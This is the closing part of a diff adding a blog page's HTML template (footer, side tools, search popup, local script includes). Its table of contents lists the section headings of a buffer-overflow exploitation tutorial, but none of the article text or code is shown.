+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crash%E6%B5%8B%E8%AF%95"><span class="nav-number">2.</span> <span class="nav-text">Crash测试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E2%BD%A3%E6%88%90%E6%B5%8B%E8%AF%95%E5%AD%97%E7%AC%A6"><span class="nav-number">3.1.</span> <span class="nav-text">1.⽣成测试字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E7%A1%AE%E5%AE%9AEIP%E5%9C%B0%E5%9D%80"><span class="nav-number">3.2.</span> <span class="nav-text">2.确定EIP地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-number">3.3.</span> <span class="nav-text">3.确定偏移量</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mona%E5%8C%BA%E9%97%B4%E6%96%B9%E5%BC%8F%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB"><span class="nav-number">3.3.1.</span> <span class="nav-text">mona区间方式计算偏移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-number">3.3.2.</span> <span class="nav-text">Metasploit计算偏移量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E9%AA%8C%E8%AF%81%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-number">3.4.</span> <span class="nav-text">4.验证偏移量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E7%BC%96%E5%86%99shellcode"><span class="nav-number">3.5.</span> <span class="nav-text">5.编写shellcode</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
